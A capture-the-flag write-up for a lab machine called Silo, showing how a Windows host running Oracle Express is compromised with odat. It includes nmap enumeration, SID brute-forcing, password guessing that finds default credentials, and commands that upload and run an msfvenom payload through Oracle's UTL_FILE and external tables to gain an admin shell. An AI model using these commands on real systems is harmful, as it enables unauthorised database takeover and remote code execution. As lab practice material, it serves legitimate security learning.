# Silo Box Write up

> Note that this was the unintended way

### Tool Used

- odat.py

  https://github.com/quentinhardy/odat

  https://github.com/quentinhardy/odat/wiki

## Enumeration

```
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open msrpc Microsoft Windows RPC
49153/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
49155/tcp open msrpc Microsoft Windows RPC
49158/tcp open msrpc Microsoft Windows RPC
49160/tcp open oracle-tns Oracle TNS listener (requires service name)
49161/tcp open msrpc Microsoft Windows RPC
49162/tcp open msrpc Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 
```



A basic scan show that the server is running an `Oracle` instance

> More Information:
>
> https://www.adampalmer.me/iodigitalsec/2013/08/12/first-steps-in-oracle-penetration-testing/

After some researching. The below information will be needed for an Oracle database

- SID 
- User / Password

You can get the SID via `nmap` or `odat`

```
nmap --script oracle-sid-brute
PORT STATE SERVICE
80/tcp open http
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
1521/tcp open oracle
| oracle-sid-brute:
|_ XE
```

With the SID found we can then brute force the user and password with odat

```
odat.py passwordguesser -s $SERVER -d XE
```

Which return a valid set of credentials `scott/tiger` (which is a default btw)

Once we got a valid set of credentials. We can login into the oracle database using `sqlplus`



After some enumeration and trying to escalate to dba using various "misconfiguration". 

I found that you can simply run `sqlplus` with `as dba` 



### Getting a shell

Notice that the oracle instance that we are running is an express version. Which mean that there is no `java` installed in the database which allow us to run command via java. Hence we need to find other method of entry

> Attack Plan:
>
> - Craft payload with msfvenom
> - Upload payload with odat utlfile
> - Execute payload with odat externaltable

```
./odat.py utlfile -s <ip> -d XE -U scott -P tiger --sysdba --putFile /Windows/Temp exploit.exe shell.exe
./odat.py externaltable -s <ip> -d XE -U scott -P tiger --sysdba --exec /Windows/Temp/exploit.exe
```

This will eventually return us an `admin` shell



### Useful Information

Windows have all writable folder at `C:\Windows\Temp` or `C:\Users\Public` 

